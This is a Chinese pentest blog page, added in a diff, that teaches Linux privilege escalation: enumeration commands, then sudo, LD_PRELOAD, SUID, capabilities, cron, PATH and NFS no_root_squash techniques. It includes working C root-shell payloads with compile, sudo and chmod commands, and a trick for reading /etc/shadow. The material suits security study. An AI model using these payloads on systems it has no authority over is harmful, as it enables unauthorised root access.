@@ -1,0 +1,644 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Doraemoo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Linux提权基础枚举信息hostname hostname 命令将返回目标机器的主机名 unname -a 输出系统信息，提供有关系统使用的内核的更多详细信息。这在搜索可能导致权限提升的潜在内核漏洞。 &#x2F;proc&#x2F;version proc 文件系统 (procfs) 提供有关目标系统进程的信息。 查看&#x2F;proc&#x2F;version可能会为提供有关内核版本和其他数据的信息，例如是否">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权基础">
+<meta property="og:url" content="https://doraemoo.github.io/2022/04/27/Linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Doraemoo">
+<meta property="og:description" content="Linux提权基础枚举信息hostname hostname 命令将返回目标机器的主机名 unname -a 输出系统信息，提供有关系统使用的内核的更多详细信息。这在搜索可能导致权限提升的潜在内核漏洞。 &#x2F;proc&#x2F;version proc 文件系统 (procfs) 提供有关目标系统进程的信息。 查看&#x2F;proc&#x2F;version可能会为提供有关内核版本和其他数据的信息，例如是否">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-27T04:39:17.000Z">
+<meta property="article:modified_time" content="2022-04-27T04:40:01.404Z">
+<meta property="article:author" content="Doraemoo">
+<meta property="article:tag" content="Pentest">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  <title>Linux提权基础 - Doraemoo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"doraemoo.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":17691437,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Doraemoo</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://w.wallhaven.cc/full/wq/wallhaven-wqv5xx.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Linux提权基础">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-27 12:39" pubdate>
+        2022年4月27日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.7k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      40 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Linux提权基础</h1>
+            
+            <div class="markdown-body">
+              <h2 id="Linux提权基础"><a href="#Linux提权基础" class="headerlink" title="Linux提权基础"></a>Linux提权基础</h2><h3 id="枚举信息"><a href="#枚举信息" class="headerlink" title="枚举信息"></a>枚举信息</h3><p><strong>hostname</strong></p>
+<p><code>hostname</code> 命令将返回目标机器的主机名</p>
+<p><strong>unname -a</strong></p>
+<p>输出系统信息，提供有关系统使用的内核的更多详细信息。这在搜索可能导致权限提升的潜在内核漏洞。</p>
+<p><strong>&#x2F;proc&#x2F;version</strong></p>
+<p>proc 文件系统 (procfs) 提供有关目标系统进程的信息。</p>
+<p>查看<code>/proc/version</code>可能会为提供有关内核版本和其他数据的信息，例如是否安装了编译器（例如 GCC）。</p>
+<p><strong>&#x2F;etc&#x2F;issue</strong></p>
+<p>系统也可以通过查看<code>/etc/issue</code>文件来识别。该文件通常包含有关操作系统的一些信息，但可以轻松定制或更改。</p>
+<p><strong>ps命令</strong></p>
+<p><code>ps</code> 命令是查看 Linux 系统上正在运行的进程的有效方法。</p>
+<p><code>ps</code> 将显示以下内容；</p>
+<ul>
+<li>PID：进程ID（进程唯一）</li>
+<li>TTY：用户使用的终端类型</li>
+<li>时间：进程使用的 CPU 时间量（这不是该进程运行的时间）</li>
+<li>CMD：正在运行的命令或可执行文件（不会显示任何命令行参数）</li>
+</ul>
+<p><strong>ps常用方法：</strong></p>
+<ul>
+<li><code>ps -A</code>: 查看所有正在运行的进程</li>
+<li><code>ps axjf</code>：查看进程树（查看树的形成直到<code>ps axjf</code>下面运行）</li>
+<li><code>ps aux</code>：<code>aux</code> 选项将显示所有用户的进程 (a)，显示启动进程的用户 (u)，并显示未连接到终端的进程 (x)。查看 ps aux 命令输出，我们可以更好地了解系统和潜在的漏洞。</li>
+</ul>
+<p><strong>env</strong></p>
+<p><code>env</code> 命令将显示环境变量</p>
+<p>PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限提升。</p>
+<p><strong>sudo -l</strong></p>
+<p>目标系统可以配置为允许用户以 root 权限运行一些（或全部）命令。<code>sudo -l</code> 命令可用于列出用户可以使用sudo运行的所有命令。</p>
+<p><strong>ls</strong></p>
+<p><code>ls -la</code> 查看隐藏文件</p>
+<p><strong>id</strong></p>
+<p><code>id</code> 命令将提供用户权限级别和组成员身份的一般概述。</p>
+<p><strong>&#x2F;etc&#x2F;passwd</strong></p>
+<p>读取<code>/etc/passwd</code>文件是发现系统上用户的一种简单方法。</p>
+<p>使用 grep 查找“home”，因为真实用户很可能将他们的文件夹放在“home”目录下.</p>
+<p><strong>ifconfig</strong></p>
+<p>目标系统可能是另一个网络的枢纽点。<code>ifconfig</code> 命令将提供有关系统网络接口的信息.</p>
+<p><strong>ip route</strong></p>
+<p>查看存在哪些网络路由</p>
+<p><strong>netstat</strong></p>
+<ul>
+<li><code>netstat -a</code>：显示所有监听端口和已建立的连接。</li>
+<li><code>netstat -at</code>或者 <code>netstat -au</code>也可以用来分别列出 TCP 或 UDP 协议。</li>
+<li><code>netstat -l</code>：以“监听”模式列出端口。这些端口已打开并准备好接受传入连接。这可以与“t”选项一起使用，以仅列出使用 TCP 协议侦听的端口</li>
+<li><code>netstat -tp</code>: 列出服务名称和 PID 信息的连接。</li>
+<li><code>netstat -i</code>：显示接口统计信息。</li>
+<li><code>netstat -ano</code> 可以细分如下；<ul>
+<li><code>-a</code>: 显示所有套接字</li>
+<li><code>-n</code>: 不解析名称</li>
+<li><code>-o</code>：显示计时器</li>
+</ul>
+</li>
+</ul>
+<p><strong>find命令</strong></p>
+<ul>
+<li><code>find . -name flag1.txt</code>: 在当前目录中找到名为“flag1.txt”的文件</li>
+<li><code>find /home -name flag1.txt</code>: 在 &#x2F;home 目录中找到文件名“flag1.txt”</li>
+<li><code>find / -type d -name config</code>: 在“&#x2F;”下找到名为config的目录</li>
+<li><code>find / -type f -perm 0777</code>：查找具有777权限的文件（所有用户可读、可写和可执行的文件）</li>
+<li><code>find / -perm a=x</code>: 查找可执行文件</li>
+<li><code>find /home -user frank</code>: 在“&#x2F;home”下查找用户“frank”的所有文件</li>
+<li><code>find / -mtime 10</code>: 查找最近 10 天内修改过的文件</li>
+<li><code>find / -atime 10</code>: 查找过去 10 天内访问过的文件</li>
+<li><code>find / -cmin -60</code>: 查找在过去一小时（60 分钟）内更改的文件</li>
+<li><code>find / -amin -60</code>: 查找最近一小时（60 分钟）内的文件访问<ul>
+<li><code>find / -size 50M</code>: 查找大小为 50 MB 的文件</li>
+</ul>
+</li>
+</ul>
+<p>可以写入或执行的文件夹和文件：</p>
+<ul>
+<li><code>find / -writable -type d 2&gt;/dev/null</code>: 查找所有可写文件夹</li>
+<li><code>find / -perm -222 -type d 2&gt;/dev/null</code>: 查找所有可写文件夹</li>
+<li><code>find / -perm -o w -type d 2&gt;/dev/null</code>: 查找所有可写文件夹</li>
+<li><code>find / -perm -o x -type d 2&gt;/dev/null</code> : 查找世界可执行文件夹</li>
+</ul>
+<p>查找开发工具和支持的语言：</p>
+<ul>
+<li><code>find / -name perl*</code></li>
+<li><code>find / -name python*</code></li>
+<li><code>find / -name gcc*</code></li>
+</ul>
+<p>查找特定文件权限：</p>
+<ul>
+<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code>: 查找带有 SUID 位的文件，它允许我们以比当前用户更高的权限级别运行文件。</li>
+</ul>
+<p>自动枚举工具：</p>
+<ul>
+<li><strong>LinPeas</strong>：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https :&#x2F;&#x2F;github.com&#x2F;carlospolop&#x2F;privilege-escalation-awesome-scripts-suite&#x2F;tree&#x2F;master&#x2F;linPEAS</a></li>
+<li><strong>LinEnum：</strong><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https :&#x2F;&#x2F;github.com&#x2F;rebootuser&#x2F;LinEnum</a></li>
+<li><strong>LES（Linux Exploit Suggester）：</strong><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https :&#x2F;&#x2F;github.com&#x2F;mzet-&#x2F;linux-exploit-suggester</a></li>
+<li><strong>Linux 智能枚举：</strong><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https :&#x2F;&#x2F;github.com&#x2F;diego-treitos&#x2F;linux-smart-enumeration</a></li>
+<li><strong>Linux 隐私检查器：</strong> <a target="_blank" rel="noopener" href="https://github.com/linted/linuxprivchecker">https :&#x2F;&#x2F;github.com&#x2F;linted&#x2F;linuxprivchecker</a></li>
+</ul>
+<h3 id="权限提升：内核利用"><a href="#权限提升：内核利用" class="headerlink" title="权限提升：内核利用"></a>权限提升：内核利用</h3><ol>
+<li>识别内核版本</li>
+<li>搜索并找到目标系统内核版本的漏洞利用代码</li>
+<li>运行漏洞利用</li>
+</ol>
+<h3 id="权限提升：Sudo"><a href="#权限提升：Sudo" class="headerlink" title="权限提升：Sudo"></a>权限提升：Sudo</h3><p><code>sudo -l</code>任何用户都可以使用该命令检查与 root 权限相关的当前情况。</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/%E6%98%AF%E4%B8%80%E4%B8%AA%E6%9C%89%E4%BB%B7%E5%80%BC%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%8C%E5%AE%83%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%89%E5%85%B3%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%82%A8%E5%8F%AF%E8%83%BD%E6%8B%A5%E6%9C%89">https://gtfobins.github.io/是一个有价值的网站，它提供了有关如何使用您可能拥有</a> sudo 权限的任何程序的信息。</p>
+<p><strong>利用应用程序功能</strong></p>
+<p>某些应用程序不会有已知的漏洞利用。</p>
+<p>例如，Apache2 有一个支持加载替代配置文件的选项（<code>-f</code>：指定替代 ServerConfigFile）。</p>
+<p>使用此选项加载<code>/etc/shadow</code>文件将导致包含<code>/etc/shadow</code>文件。</p>
+<p><strong>利用 LD_PRELOAD</strong></p>
+<p>LD_PRELOAD 是一个允许任何程序使用共享库的函数。</p>
+<p>如果启用了“env_keep”选项，我们可以生成一个共享库，该库将在程序运行之前加载和执行。</p>
+<p>这个提权的步骤可以总结如下：</p>
+<ol>
+<li>检查 LD_PRELOAD（使用 env_keep 选项）</li>
+<li>编写编译为共享对象（.so 扩展名）文件的简单 C 代码</li>
+<li>使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> _init() &#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>setgid(<span class="hljs-number">0</span>);<br>setuid(<span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>将此代码保存为 shell.c 并使用 gcc 使用以下参数将其编译为共享对象文件</p>
+<p><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p>
+<p>现在可以在启动用户可以使用 sudo 运行的任何程序时使用这个共享对象文件。</p>
+<p>例如<code>find</code></p>
+<p><code>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</code></p>
+<p>这将导致生成具有 root 权限的 shell。</p>
+<h3 id="权限提升：SUID"><a href="#权限提升：SUID" class="headerlink" title="权限提升：SUID"></a>权限提升：SUID</h3><p><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code>将列出设置了 SUID 或 SGID 位的文件</p>
+<p>将查找出的可执行文件与 GTFOBins ( <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io</a> ) 进行比较。</p>
+<h3 id="权限提升：Capabilities"><a href="#权限提升：Capabilities" class="headerlink" title="权限提升：Capabilities"></a>权限提升：Capabilities</h3><p>系统管理员可以用来提高进程或二进制文件权限级别的另一种方法是“Capabilities”。Capabilities有助于在更精细的级别上管理权限。例如，如果 SOC 分析师需要使用需要启动套接字连接的工具，普通用户将无法做到这一点。如果系统管理员不想给这个用户更高的权限，他们可以改变二进制文件的能力。结果，二进制文件无需更高权限的用户即可完成其任务。</p>
+<p><code>getcap</code> 工具列出启用的功能。</p>
+<p>当以非特权用户身份运行时，<code>getcap -r /</code>会产生大量错误</p>
+<p>因此最好将错误消息重定向到 &#x2F;dev&#x2F;null</p>
+<p><code>getcap -r / 2&gt;/dev/null</code></p>
+<p>如果我们找到任何设置的Capabilities，可以查找GTFObins来提升权限。</p>
+<h3 id="权限提升：Cron-Jobs"><a href="#权限提升：Cron-Jobs" class="headerlink" title="权限提升：Cron Jobs"></a>权限提升：Cron Jobs</h3><p>Cron jobs用于在特定时间运行脚本或二进制文件，默认情况下，它们以其所有者而不是当前用户的权限运行。</p>
+<p>如果有一个以 root 权限运行的计划任务，我们可以更改将要运行的脚本，那么我们的脚本将以 root 权限运行。</p>
+<p>任何用户都可以读取cron jobs的文件，<code>/etc/crontab</code></p>
+<p>即使删除了定时任务脚本，但 cron jobs仍然存在。<br>如果未定义脚本的完整路径，cron 将引用 &#x2F;etc&#x2F;crontab 文件中 PATH 变量下列出的路径。在这种情况下，我们应该能够在用户的主文件夹下创建一个自定义脚本，并且它由 cron 作业运行。</p>
+<h3 id="权限提升：PATH"><a href="#权限提升：PATH" class="headerlink" title="权限提升：PATH"></a>权限提升：PATH</h3><p>如果用户具有写入权限的文件夹位于path中，您可能会劫持应用程序以运行脚本。Linux 中的 PATH 是一个环境变量，它告诉操作系统在哪里搜索可执行文件。对于任何未内置于 shell 或未使用绝对路径定义的命令，Linux 将开始在 PATH 下定义的文件夹中进行搜索。（PATH是这里所说的环境变量，path是文件的位置）。</p>
+<p>例如执行thm命令</p>
+<p>“path”将在 PATH 下列出的文件夹中查找名为“thm”的可执行文件。</p>
+<p>如果在 PATH 下列出了任何可写文件夹，我们可以在该目录下创建一个名为 thm 的二进制文件，并让我们的“路径”脚本运行它。由于设置了 SUID 位，此二进制文件将以 root 权限运行。</p>
+<h3 id="权限提升：NFS"><a href="#权限提升：NFS" class="headerlink" title="权限提升：NFS"></a>权限提升：NFS</h3><p>NFS（网络文件共享）配置保存在 &#x2F;etc&#x2F;exports 文件中。此文件是在 NFS 服务器安装期间创建的，通常可供用户读取。</p>
+<p>此权限提升的关键元素是可以在上面看到的“<code>no_root_squash</code>”选项。默认情况下，NFS 会将 root 用户更改为 nfsnobody 并剥夺任何文件以 root 权限操作。如果可写共享上存在“no_root_squash”选项，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它。</p>
+<p>枚举攻击机器的可挂载共享</p>
+<p><code>showmount -e &lt;target ip&gt;</code></p>
+<p>我们将把一个“no_root_squash”共享挂载到我们的攻击机器上并开始构建我们的可执行文件。</p>
+<p>由于我们可以设置 SUID 位，因此将在目标系统上运行 &#x2F;bin&#x2F;bash 的简单可执行文件。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    setuid(<span class="hljs-number">0</span>);<br>    setgid(<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p><code>gcc nfs.c -o nfs -w</code></p>
+<p>编译代码后，设置 SUID 位。</p>
+<p><code>chmod +s nfs</code></p>
+<p>运行nfs文件后，可获得root shell</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Pentest/">Pentest</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/23/BurpSuite-Intruder%E6%A8%A1%E5%9D%97%E5%9B%9B%E7%A7%8D%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F/">
+                        <span class="hidden-mobile">BurpSuite Intruder模块四种攻击模式</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?17691437";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
